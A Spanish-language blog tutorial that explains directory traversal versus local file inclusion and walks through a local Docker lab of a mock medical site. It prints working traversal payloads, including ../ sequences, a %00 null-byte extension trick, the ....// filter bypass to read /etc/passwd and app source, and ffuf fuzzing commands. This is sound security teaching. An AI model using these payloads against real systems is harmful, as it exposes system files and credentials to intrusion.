---
layout      : post
title       : "Salto entre directorios"
author      : lanz
footer_image: assets/images/footer-card/folder.png
footer_text : Lectura de archivos del sistema
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-banner.png
category    : [ article ]
tags        : [ lanzboratorio, path-traversal, lfi ]
---
Exploraremos las diferencias entre un **salto de directorios** y una **inclusión local de archivos**, practicaremos como conseguir navegar entre carpetas y leeremos mucho.

💃 Pesadumbre 💃

1. [¿Qué es un salto de directorios (directory traversal)?](#explicacion-directory-traversal)
2. [¿Qué es una inclusión de archivos locales (LFI)?](#explicacion-lfi)
3. [¿Directory Traversal es igual a LFI?](#explicacion-traversal-vs-lfi)
4. [Introducción al Lanzboratorio](#intro-lab)
  * [Instalamos Docker](#instalacion-docker)
  * [Levantamos laboratorio](#ejecucion-lab)
5. [Conociendo el entorno vulnerable](#enumeracion)
6. [Endpoint /regulacion: Leyendo archivos ¿internos?](#explotacion-1)
  * [Leer archivos directamente](#explotacion-traversal-directo)
  * [Leer archivos saliéndonos de los directorios con ../](#explotacion-traversal-sequences)
  * [Leer archivos agregando extensión al final](#explotacion-traversal-extension)
  * [Leer archivos agregando extensión al final y Null Byte](#explotacion-traversal-null-extension)
  * [Leer archivos bypasseando posible restricción ../](#explotacion-traversal-sequences-stripped)
7. [Endpoint /normatividad: Leyendo archivos ¿internos?](#explotacion-2)
8. [Próximamente: LFI & RFI](#post-explotacion)

...

# ¿Qué significa saltar entre directorios? [#](#explicacion-directory-traversal) {#explicacion-directory-traversal}

Empezamos suave.

¿Qué es un [directorio](https://es.wikipedia.org/wiki/Directorio)? Un "sitio" donde podemos agrupar archivos.

O sea, cuando nos referimos a saltar entre directorios, hablamos de movernos entre grupos de archivos :O

¿Pero pa qué? Sencillamente, para llegar desde una ruta a archivos que están en otras rutas (:

...

Ya entrando en tecnicismos y jugueterías... Te voy a plasmar un ejemplo bien sencillo.

A veces en sistemas basados en [Unix,](https://es.wikipedia.org/wiki/Unix) cuando queremos volver entre carpetas o simplemente salirnos de la actual e ir a otra, usamos el estándar `../`, su uso es muy sencillo y es de vital importancia en este tipo de ataque, veamos un ejemplo:

* [\*Unix: Unix Files and Directories Tutorial](https://users.cs.utah.edu/~zachary/isp/tutorials/files/files.html#:~:text=The%20file%20system%20is%20called,given%20control%20over%20one%20directory.)
* [Windows: File path formats on Windows systems](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats)

---

```bash
➧ mkdir -p test/hola/buenas
➧ cd test
➧ cd hola
➧ cd buenas
➧ pwd 
/home/lanz/test/hola/buenas
➧ cd ..
➧ pwd 
/home/lanz/test/hola
```

¿Si usamos `..` para salirnos de un directorio, entonces podemos salirnos de dos directorios usando `....`?

```bash
➧ cd buenas
➧ pwd 
/home/lanz/test/hola/buenas
➧ cd ....  
cd: no such file or directory: ....
```

Nonono, ya que está tomando `....` como si fuera el nombre de una carpeta y claramente no existe esa carpeta, por lo que debemos indicarle que queremos que nos mueva entre directorios (recuerda que cada directorio tiene la carpeta `..`, que es simplemente una referencia al directorio que "hereda" esa carpeta):

```bash
➧ pwd 
/home/lanz/test/hola/buenas
➧ cd ../../
➧ pwd 
/home/lanz/test
```

Listo, ya sabemos como es que funciona un salto entre directorios en el sistema.

...

Ahora, ¿cómo es que esto se puede explotar o vulnerar? El ataque de **Salto de Directorios** (**Directory Traversal**) toma la idea anterior y sucede cuando una funcionalidad (por lo general sitio web) está leyendo archivos del sistema y un usuario tiene interacción con esa lectura, ya sea pasándole el nombre del archivo, la ruta o los dos.

Si no existe suficiente sanitización en ese proceso, un atacante podría **moverse entre directorios** para leer archivos a los cuales la aplicación no debería acceder. Logrando así el robo de información, como usuarios, procesos, código de la aplicación, credenciales, muuuuchas cosas.

# ¿Como así que inclusión de archivos locales? [#](#explicacion-lfi) {#explicacion-lfi}

Este apartado es sencillo, pero existe una confusión gigante, ya que se cree que un **Salto de Directorios** (**Directory Traversal**) es lo mismo que una **Inclusión de Archivos Locales** (**Local File Inclusion**), que si asociamos nombres, pues sí, estamos incluyendo archivos locales para leer su contenido. PEEEERO cuidao:

* Digamos que encontramos un sitio web creado con lógica de `PHP` (que por ende está ejecutando archivos `.php`).
* Existe una opción para subir archivos y no tiene restricciones.
* Subimos uno llamado `hola.php` y en su contenido `<?php phpinfo(); ?>`.
* Después encontramos otra funcionalidad que lee imágenes (archivos) y las postea en el sitio web.

Como atacantes jugamos con esta última opción y nos damos cuenta de que tenemos la posibilidad de llegar a otros archivos en lugar de las imágenes, como por ejemplo al archivo `/etc/passwd` en **Linux** o al archivo `c:\Windows\System32\Drivers\etc\hosts` en **Windows**. Y también logramos llegar al archivo que subimos llamado `hola.php`.

¿Qué crees que pasa cuando leemos ese archivo?

Pues pueden pasar dos cosas :P

* Que el sitio web muestre el contenido del archivo, o sea: `<?php phpinfo(); ?>`.
* Que el sitio web **interprete** el contenido del archivo, o sea:
  
  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/milk/Milk_page80_RCEconfirmed_phpinfo.png" style="width: 100%;"/>

  > Imagen de referencia del [writeup que le hice a **Milk** en **HackMyVM**](https://lanzt.github.io/hmv/milk), si te pica la curiosidad, dale una lectura despues de este :P

Con lo cual el archivo estaría siendo incrustado/incluido como parte de la ejecución del sitio web. ¡Y eso, mi gentesita, eso es una **Inclusión Local de Archivos** (**LFI** / **Local File Inclusion**)!

> Tambien existe el mismo enfoque pero contra archivos remotos (**RFI** / **Remote File Inclusion**), el cual permite incluir/incrustar/interpretar archivos externos y alojados **fuera** de la aplicación, en otro post ahondaremos esta vuln.

---

# ¿Un LFI es igual a un Salto de Directorios? [#](#explicacion-traversal-vs-lfi) {#explicacion-traversal-vs-lfi}

Pos no, como ya vimos, un **Salto entre Directorios** (**Directory Traversal** / **Path Traversal**) permite movernos entre carpetas y leer el contenido de los archivos alojados en dichas carpetas.

Y una **Inclusión Local de Archivos** (**Local File Inclusion** / **LFI**) suma lo obtenido por el **Salto de Directorios** (movernos entre directorios) para llegar a archivos y que estos sean **renderizados** como parte de la ejecución de la web, no solo leídos, sino **INTERPRETADOS**. Lo cual lo hace un ataque mucho más peligroso, ya que se pueden llegar a ejecutar comandos en el sistema.

# Empezamos Lanzboratorio: Directory Travesal & LFI [#](#intro-lab) {#intro-lab}

Ahora sí, metámosle candela a esta vaina que estoy que me leo 📑

## Instalamos Docker [#](#instalacion-docker) {#instalacion-docker}

Vamos a jugar con [la **Docker Comunity Edition**](https://stackoverflow.com/questions/45023363/what-is-docker-io-in-relation-to-docker-ce-and-docker-ee-now-called-mirantis-k) para [**kali linux**](https://www.kali.org/docs/containers/installing-docker-on-kali/) (igual para tu SO fijo, encuentras en internet la manera de instalarlo):

```bash
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \
 sudo tee /etc/apt/sources.list.d/docker.list

curl -fsSL https://download.docker.com/linux/debian/gpg |
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io
```

## Clonamos Lanzboratorio [#](#ejecucion-lab) {#ejecucion-lab}

Acá estarán alojados los laboratorios:

* [https://github.com/lanzt/Lanzboratorios](https://github.com/lanzt/Lanzboratorios)

---

Si quieres clonar el repositorio y acceder a todos:

```bash
git clone https://github.com/lanzt/Lanzboratorios
```

Si por el contrario, quieres jugar con este laboratorio en específico, entras en su carpeta y descargas el comprimido (`.zip`), lo descomprimes y listones.

* [https://github.com/lanzt/Lanzboratorios/tree/main/Directory%20Traversal](https://github.com/lanzt/Lanzboratorios/tree/main/Directory%20Traversal)

```bash
➧ cd "Directory Traversal"
➧ ls 
 app   docker-compose.yml   nginx
```

Ahora procedemos a ejecutarlo, con este simple paso (desde donde esté el archivo `docker-compose.yml`):

```bash
sudo docker compose up --build
```

En algún punto veríamos que la app fue levantada sobre el puerto 3000, ese es un mensaje de log que le deje a la app en caso de que quieras ejecutarla sin Docker (`node index.js`), pero en la configuración que le hice, la aplicación está siendo servida por **nginx** y hosteada en el puerto **80**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-bash-docker-compose-app-running.png" style="width: 100%;"/>

Y si validamos estaríamos listos para empezar a auditarla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-app-running.png" style="width: 100%;"/>

Cuando ya quieras terminar la ejecución de la app, simplemente lanza `CTRL+C`.

Las siguientes opciones que tienes son, borrar los contenedores creados o borrar esos contenedores y además sus imágenes, ejecuta según lo que desees:

Borrar contenedores:

```bash
sudo docker compose down
```

Borrar contenedores e imágenes:

```bash
sudo docker compose down --rmi all
```

Empecemos (:

# Enumeración [#](#enumeracion) {#enumeracion}

Lo primero que encontramos al visitar el sitio web es:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-app-running.png" style="width: 100%;"/>

Un centro médico, el cual ofrece servicios médicos :P

Revisando el código fuente no vemos nada llamativo. Lo único es que tenemos varios apartados para visitar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-navbar-links.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-footer-links.png" style="width: 100%;"/>

Revisando cada uno de ellos, notamos cositas curiosas en `/regulacion` y `/normatividad`:

**/regulacion**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar.png" style="width: 100%;"/>

**/normatividad**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad-archivos-visualizar.png" style="width: 100%;"/>

Vamos a empezar indagando con el endpoint `/regulacion`.

# /regulacion: Leyendo archivos ¿internos? [#](#explotacion-1) {#explotacion-1}

Como vimos, nos está mostrando en archivos toda la reglamentación y normas que siguen, peeeero hay algo interesante, si abrimos uno de los archivos, este está siendo buscando con el parámetro `nombreArchivo`:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=Regulación 203 de 2015.pdf
```

Nos pone a pensar, ya que:

* Quiere decir que ese parámetro está llegando a una carpeta del sistema.
* Pueda que la lógica no esté tan bien implementada y no solo se puedan leer archivos de esa carpeta 😈

Indaguemos en esto último.

Sabemos que al enviar una petición tal que así, nos responde correctamente:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=Regulación 203 de 2015.pdf
```

Y si colocamos un nombre que posiblemente no exista:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=buenas
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar-buenas.png" style="width: 100%;"/>

Pero, ¿qué pasa si evocamos la vulnerabilidad de la que va el post?

* [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

## Leer archivos directamente [#](#explotacion-traversal-directo) {#explotacion-traversal-directo}

Podríamos probar a salirnos de la carpeta actual de donde esté tomando los `.pdf` y llegar por ejemplo al objeto `/etc/passwd`, pero ¿y si no es necesario salirnos y logramos llegar directamente? Digamos:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=/etc/passwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar-etc-passwd.png" style="width: 100%;"/>

Nadita, pero esto nos da una posible idea de lo que esté pasando en la lógica:

```txt
nombreArchivo = /etc/passwd
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf//etc/passwd
```

Y claramente no sirve.

## Leer archivos saliéndonos de los directorios con ../ [#](#explotacion-traversal-sequences) {#explotacion-traversal-sequences}

Vamos a la siguiente prueba: intentar salirnos de esa ruta usando `../`.

Imaginemos que internamente sea procesado así:

```txt
nombreArchivo = ../../../../../../../../../../../etc/passwd
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf/../../../../../../../../../../../etc/passwd
ruta = /etc/passwd
```

> Recuerda agregar varios saltos de directorios, así evitas quedarte en alguna carpeta.

Probemos:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=../../../../../../../../../../../etc/passwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar-simple-traversal-etc-passwd.png" style="width: 100%;"/>

Aún nada (incluso agregándole más saltos de directorios), pero tenemos varias cosas por probar.

Algo que podemos considerar es que si exista algún tipo de sanitización en la lógica, como que este validando que al final del parámetro esté llegando la extensión `.pdf` o que esté eliminando las cadenas de texto `../`, o que sencillamente esta app no sea vulnerable (:

Intentemos lo de la extensión.

## Leer archivos agregando extensión al final [#](#explotacion-traversal-extension) {#explotacion-traversal-extension}

Internamente, puede estar pasando esto:

```txt
nombreArchivo = ../../../../../../../../../../../etc/passwd
> ¿nombreArchivo termina con la extensión .pdf?
> no
> responde 404, ya que se esta intentando acceder a algo invalido
```

```txt
nombreArchivo = ../../../../../../../../../../../etc/passwd.pdf
> ¿nombreArchivo termina con la extensión .pdf?
> si
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf/../../../../../../../../../../../etc/passwd.pdf
ruta = /etc/passwd.pdf
```

Solo que esa ruta no es válida y nos devolverá error.

## Leer archivos agregando extensión al final y Null Byte [#](#explotacion-traversal-null-extension) {#explotacion-traversal-null-extension}

Para intentar solventarlo y que la lógica no procese ese `.pdf` podemos usar un [Null Byte](https://www.thehacker.recipes/web/inputs/null-byte-injection), así le indicamos que de por terminada la cadena de texto justo después de encontrar ese carácter, por lo que todo lo que este después no será tomado en cuenta, pero puede ayudarnos a saltarnos validaciones.

> El **Null Byte** se identifica por el caracter `\x00` o `%00`.

* [Null-byte injection](https://www.thehacker.recipes/web/inputs/null-byte-injection)

Por lo que volviendo a nuestro intento, podríamos pensar:

```txt
nombreArchivo = ../../../../../../../../../../../etc/passwd%00.pdf
> ¿nombreArchivo termina con la extensión .pdf?
> si
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf/../../../../../../../../../../../etc/passwd%00.pdf
ruta = /esta/es/la/ruta/de/los/pdf/../../../../../../../../../../../etc/passwd
ruta = /etc/passwd
```

Validamoooos:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=../../../../../../../../../../../etc/passwd%00.pdf
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar-simple-traversal-null-extension-etc-passwd.png" style="width: 100%;"/>

Nop, seguimos igual.

## Leer archivos bypasseando posible restricción ../ [#](#explotacion-traversal-sequences-stripped) {#explotacion-traversal-sequences-stripped}

También podemos pensar que quizá en la lógica se esté contemplando el salto entre directorios, o sea, que los desarrolladores hayan dicho:

```txt
> Jorguito Dev: "jmmm, tenemos que tener en cuenta que un usuario
malicioso podria querer mirar archivos de otras carpetas moviendose
entre directorios"
> Sancho Dev: "¿pero como se va a mover entre directorios?"
> Jorguito Dev: "Ahh pues usando ../../"
> Sancho Dev: "Ahhh simple, hagamos una validación, si llega ../ en el
parametro, reemplacemoslo por vacio y ya"
> Jorguito Dev: "Eso estaba pensando, de una"
```

Siguiendo ese pensamiento, si enviamos:

```txt
nombreArchivo = ../../../../../../../../../../../etc/passwd
> ¿nombreArchivo contiene ../?
> si
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf/../../../../../../../../../../../etc/passwd
ruta = /esta/es/la/ruta/de/los/pdf/etc/passwd
```

Obtendríamos el error que ya sabemos...

... pensando ...

Hay una prueba linda, pero vamos a depender de la lógica que no conocemos.

* Pensamos que se están eliminando los saltos (`../`).
* ¿Qué pasaría si enviáramos `....//` o `..././`
* La lógica removería `../` de `....//` (o de `..././`) y al final obtendríamos `../`!

Solo que para que esto pase estamos sujetos a que los desarrolladores hayan implementado mal la validación, ya que si están removiendo los saltos HASTA QUE NO EXISTAN MÁS COINCIDENCIAS, tamos pailas.

Este escenario nos liquida la idea:

```txt
nombreArchivo = ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
> ¿nombreArchivo contiene ../?
> si
> entonces debemos remover sus coincidencias
nombreArchivo = ../../../../../../../../../../../../etc/passwd
> listo ¿nombreArchivo aún contiene ../?
> si
> entonces debemos remover sus coincidencias de nuevo (y las veces que sea necesario)
nombreArchivo = etc/passwd
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf/etc/passwd
```

Pero como somos juakers y debemos probar de todo. En caso de que se esté validando UNA SOLA VEZ, podríamos bypassear el filtro:

```txt
nombreArchivo = ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
> ¿nombreArchivo contiene ../?
> si
> entonces debemos remover sus coincidencias
nombreArchivo = ../../../../../../../../../../../../etc/passwd
> listo, ya eliminamos los ../, sigamos
ruta = /esta/es/la/ruta/de/los/pdf/<nombreArchivo>
ruta = /esta/es/la/ruta/de/los/pdf/../../../../../../../../../../../../etc/passwd
ruta = /etc/passwd
```

Así que intentemos a ver queeeeeeeeeee:

```txt
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
> o (da igual cual, pero para que sepas que hay varias opciones)
http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=..././..././..././..././..././..././..././..././..././..././..././..././etc/passwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar-simple-traversal-stripped-etc-passwd.png" style="width: 100%;"/>

Se nos descargó un archivoooooooooooooooooooo!!

Si lo revisamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-bash-cat-simple-traversal-stripped-etc-passwd.png" style="width: 100%;"/>

🔥 AJAJAIIIII, encontramos un salto de directorios y podemos ver archivos del sistemaaaaaaaaa 🔥

> Y efectivamente sabemos que se está realizando una validación y que se ejecuta una sola vez :P

> [Traversal sequences stripped non-recursively](https://book.hacktricks.xyz/pentesting-web/file-inclusion#traversal-sequences-stripped-non-recursively)

Así que tenemos un punto para leer archivos. Sigamos explorando a ver que más archivos existen.

En [esta guía](https://book.hacktricks.xyz/pentesting-web/file-inclusion) encontramos una lista de objetos comunes en **Linux** y otra en **Windows**, como el lab está montado en un sistema \*unix, pos usaremos la de Linux:

* [Common files **Linux**](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt).
* [Common files **Windows**](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).

Para descubrir los archivos podemos crear un script que lo haga o jugar con herramientas automatizadas, por ahora juguemos con una que personalmente me gusta mucho: [ffuf](https://github.com/ffuf/ffuf).

```bash
ffuf -c -w file_inclusion_linux.txt -u 'http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=....//....//....//....//....//....//....//....//....//....//....//..../FUZZ'
```

Y encontramos varios resultados:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-bash-ffuf-simple-traversal-stripped-files.png" style="width: 100%;"/>

Así podemos llegar a varios archivos del sistema y extraer información útil. Lo siguiente sería intentar obtener la ruta o archivos de la aplicación web, quizá tengan credenciales, subdominios, servicios internos, muuucha información.

Jugando con los saltos encontramos el archivo principal de la aplicación:

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/raft-large-files.txt -u 'http://127.0.0.1/regulacion/archivos/descargar?nombreArchivo=....//....//FUZZ'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-bash-ffuf-simple-traversal-stripped-raft-large-files.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-regulacion-archivos-descargar-simple-traversal-stripped-indexjs.png" style="width: 100%;"/>

De ahí podemos sacar varias cositas :P

<span style="color: yellow;">Y así es que explotamos un **salto de directorios** (**path traversal** / **directory traversal**)!!!</span>

¿¿¿Pero también tenemos una **Inclusión Local de Archivos**??? ¿Qué crees?

No no no (: Ya que los archivos no están siendo interpretados (incluidos) en la renderización del sitio web.

...

Si bien acá podría terminar el post, aún nos queda un endpoint curioso que también juega con archivos, así que a auditar todito.

...

# /normatividad: Archivos ¿internos? [#](#explotacion-2) {#explotacion-2}

Recordemos lo que nos mostraba:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad-archivos-visualizar.png" style="width: 100%;"/>

Ya que explotamos una vuln relacionada con archivos, podemos imaginar que el desarrollador fue el mismo en ambos apartados, con lo que posiblemente exista también la vulnerabilidad en este apartado, ¿no? O al menos también debemos probarla (:

Tomamos el payload que nos funcionó la última vez y lo adaptamos:

```txt
http://127.0.0.1/normatividad/archivos/visualizar?acuerdo=....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

Lo enviamos yyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad-archivos-visualizar-simple-traversal-stripped-etc-passwd.png" style="width: 100%;"/>

EJEJEEEEY, efectivamente se usó la misma lógica para la lectura del archivo yyyy logramos bypassear de nuevo el filtro 🤠

Con lo cual hemos encontrado dos vulnerabilidades de **Directory Traversal** en este sitio web.

Algo que quizá notaste es que el archivo está siendo incrustado directamente en la ejecución, ¿será que tenemos un **LFI**? Validémoslo:

```txt
http://127.0.0.1/normatividad/archivos/visualizar?acuerdo=....//....//index.js
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad-archivos-visualizar-simple-traversal-stripped-indexjs.png" style="width: 100%;"/>

El archivo `.js` (JavaScript) no es interpretado, pero si detallamos el código nos indica que se está usando el motor de plantillas **EJS**:

```js
[...]
const ejs = require("ejs");
[...]
app.set("view engine", "ejs");
[...]
```

* [https://ejs.co/](https://ejs.co/)

Con él podemos usar archivos `.ejs` (estructura `HTML` combinado con sintaxis **ejs**) para darle vida a un sitio web.

> Así que si logramos incrustarlo, posiblemente podriamos hacer que el codigo con sintaxis **EJS** sea ejecutado y explotar un **Local File Inclusion**!!

El llamado a esos archivos en el código **JavaScript** lo vemos así: `render('casita')`, lo que quiere decir que existe una vista (archivo) llamada `casita.ejs`.

Revisando de nuevo el código, sabemos donde se están guardando esos archivos:

```js
[...]
app.set("views", path.join(__dirname, "views"));
[...]
```

Y que existe `index.ejs`:

```js
[...]
app.get("/", (req, res) => {
    res.render("index", { pageTitle: "Inicio" });
});
[...]
```

Por lo que:

```txt
http://127.0.0.1/normatividad/archivos/visualizar?acuerdo=....//....//views/index.ejs
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/directory-traversal/lanzbDIRECTORYTRAVERSAL-1-page80-normatividad-archivos-visualizar-simple-traversal-stripped-indexejs.png" style="width: 100%;"/>

Pero no, el archivo se está mostrando en la ejecución, pero no está siendo interpretado ):

Finalmente, encontramos dos **Saltos de Directorios** / **Directory Traversal** en esta aplicación.

Y así hemos concluido con el laboratorio y la explicación.

# Próximamente: LFI & RFI [#](#post-explotacion) {#post-explotacion}

Después te mostraré un laboratorio donde SI explotemos una **inclusión local de archivos** (**LFI**) para ejecutar comandos en el sistema.

...

Por ahora espero te hayan quedado claros los conceptos, que aun sin tener algo con lo cual diferenciar, hayas divisado la distinción entre un **Salto de Directorios** y una **Inclusión Local de Archivos**, que hayas aprendido o reforzado y sobre todo te hayas divertido.

¡Muchas gracias por leer y nos veremos pronto pronto (: A darle duro y a seguir rompiendo de todooooooooooo!!
